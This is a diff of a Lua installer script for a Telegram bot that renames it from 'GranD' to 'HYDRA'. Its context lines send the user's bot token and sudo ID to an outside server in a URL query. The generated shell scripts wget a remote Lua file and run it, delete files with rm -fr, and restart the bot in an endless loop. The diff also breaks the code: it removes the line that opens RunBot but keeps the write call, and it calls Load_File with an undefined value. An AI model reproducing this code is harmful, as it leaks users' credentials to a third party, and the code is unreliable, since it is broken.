@@ -15,10 +15,7 @@ local AutoFiles_Write = function()
 local Create_Info = function(Token,Sudo)  
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
-s = "XXKXX"
-q = "aaaaw"
-token = "]]..Token..[["
-Sudo = ]]..Sudo..[[  
+
 ]])
 Write_Info_Sudo:close()
 end  
@@ -62,11 +59,10 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://hydraqi.ml/API/Rdha.php?id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
-print("::GranD::")
-local RunBot = io.open("GranD", 'w')
+
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/GranD
+cd $HOME/HYDRA
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr GranD.lua
 wget "https://raw.githubusercontent.com/hydraqi/HyDrA/master/HyDrA.lua"
@@ -79,11 +75,11 @@ RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/GranD
+cd $HOME/HYDRA
 while(true) do
 rm -fr ../.telegram-cli
-screen -S GranD -X kill
-screen -S GranD ./GranD
+screen -S HYDRA -X kill
+screen -S HYDRA ./HYDRA
 done
 ]])
 RunTs:close()
@@ -107,4 +103,4 @@ var = false
 end  
 return var
 end
-Load_File()
+Load_File(YES)
